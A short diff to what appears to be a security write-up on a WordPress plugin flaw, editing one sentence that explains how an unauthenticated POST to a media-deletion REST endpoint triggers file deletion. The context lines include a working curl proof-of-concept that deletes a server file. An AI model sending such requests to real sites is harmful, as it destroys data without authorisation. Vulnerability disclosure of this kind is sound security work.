@@ -59,7 +59,7 @@ function delete_media_upload($request){
 }
 ```
 
-To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-json/myplugin/v1/deletemedia` endpoint specifying the needed parameter to trigger the `wp_delete_file` function.
+To exploit this, any unauthenticated user needs to perform a POST request to the `/wp-json/myplugin/v1/deletemedia` endpoint specifying the needed parameter to trigger the `wp_delete_file` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-json/myplugin/v1/deletemedia -d '{"media":{"file":"<WORDPRESS_BASE_DIRECTORY>/license.txt"}}' -H 'Content-Type: application/json'
